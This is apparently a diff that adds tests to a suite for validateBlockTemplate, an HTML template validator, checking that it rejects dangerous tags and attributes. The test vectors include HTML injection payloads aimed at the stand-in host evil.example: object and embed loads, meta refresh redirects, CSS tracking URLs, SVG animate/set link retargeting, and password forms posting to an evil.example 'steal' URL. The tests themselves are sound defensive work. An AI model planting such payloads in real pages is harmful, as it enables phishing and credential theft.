@@ -157,6 +157,99 @@ describe('validateBlockTemplate', () => {
     expect(validateBlockTemplate('<IFRAME src="x"></IFRAME>', [], SCHEMA)).toContain('<iframe>');
   });
 
+  it('rejects tags outside the content allow-list', () => {
+    const vectors: [string, string][] = [
+      ['object', '<object data="https://evil.example/x.html" type="text/html"></object>'],
+      ['embed', '<embed src="https://evil.example/x.swf">'],
+      ['base', '<base href="https://evil.example/">'],
+      ['meta', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
+      ['link', '<link rel="stylesheet" href="https://evil.example/x.css">'],
+      ['style', '<style>body{background:url(https://evil.example/track)}</style>'],
+      ['applet', '<applet code="Evil.class"></applet>'],
+      ['frameset', '<frameset><frame src="https://evil.example/"></frameset>'],
+      ['noscript', '<noscript><p>x</p></noscript>'],
+      ['template', '<template><p>x</p></template>'],
+      ['portal', '<portal src="https://evil.example/"></portal>'],
+      ['marquee', '<marquee>x</marquee>'],
+      ['my-widget', '<my-widget></my-widget>'],
+      // SVG escape hatches: html inside svg, and the SMIL elements that can
+      // retarget an <a href> after load.
+      ['foreignobject', '<svg><foreignObject><p>x</p></foreignObject></svg>'],
+      [
+        'animate',
+        '<svg><a href="/x"><animate attributeName="href" to="https://evil.example"></animate></a></svg>',
+      ],
+      [
+        'set',
+        '<svg><a href="/x"><set attributeName="href" to="https://evil.example"></set></a></svg>',
+      ],
+      ['math', '<math><annotation-xml encoding="text/html"><p>x</p></annotation-xml></math>'],
+    ];
+    for (const [tag, html] of vectors) {
+      expect(validateBlockTemplate(html, [], SCHEMA), html).toContain(`<${tag}>`);
+    }
+  });
+
+  it('rejects an allow-listed tag nested inside a rejected one', () => {
+    expect(
+      validateBlockTemplate('<div><section><object data="x"></object></section></div>', [], SCHEMA),
+    ).toContain('<object>');
+  });
+
+  it('rejects form submission targets, so a template form cannot phish', () => {
+    expect(
+      validateBlockTemplate(
+        '<form action="https://evil.example/steal"><input name="p" type="password"></form>',
+        [],
+        SCHEMA,
+      ),
+    ).toContain('"action"');
+    expect(
+      validateBlockTemplate(
+        '<form><button type="submit" formaction="https://evil.example/steal">Go</button></form>',
+        [],
+        SCHEMA,
+      ),
+    ).toContain('"formaction"');
+  });
+
+  it('accepts the interactive markup the native blocks ship', () => {
+    // nv-header's css-only theme toggle.
+    expect(
+      validateBlockTemplate(
+        '<label class="nv-theme-toggle-label" for="nv-theme-toggle">' +
+          '<input type="checkbox" id="nv-theme-toggle" class="nv-theme-toggle-input" />' +
+          '<span class="nv-theme-toggle-icon" aria-hidden="true"></span></label>',
+        [],
+        SCHEMA,
+      ),
+    ).toBeNull();
+    // nv-todo-list's actionless create form.
+    expect(
+      validateBlockTemplate(
+        '<form class="nv-todo-create" data-nv-todo-form>' +
+          '<input id="nv-todo-title" type="text" placeholder="Add a task" required>' +
+          '<button class="nv-todo-add" type="submit">Add task</button></form>',
+        [],
+        SCHEMA,
+      ),
+    ).toBeNull();
+  });
+
+  it('accepts ordinary content markup, tables and inline svg icons', () => {
+    expect(
+      validateBlockTemplate(
+        '<article><header><h2>Title</h2><time datetime="2026-01-01">Jan</time></header>' +
+          '<figure><img src="/a.png" alt=""><figcaption>Caption</figcaption></figure>' +
+          '<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>' +
+          '<ul><li><strong>a</strong></li></ul><hr>' +
+          '<svg viewBox="0 0 16 16"><path d="M0 0h16v16H0z"></path></svg></article>',
+        [],
+        SCHEMA,
+      ),
+    ).toBeNull();
+  });
+
   it('rejects event handler attributes', () => {
     expect(validateBlockTemplate('<button onclick="steal()">x</button>', [], SCHEMA)).toContain(
       'onclick',
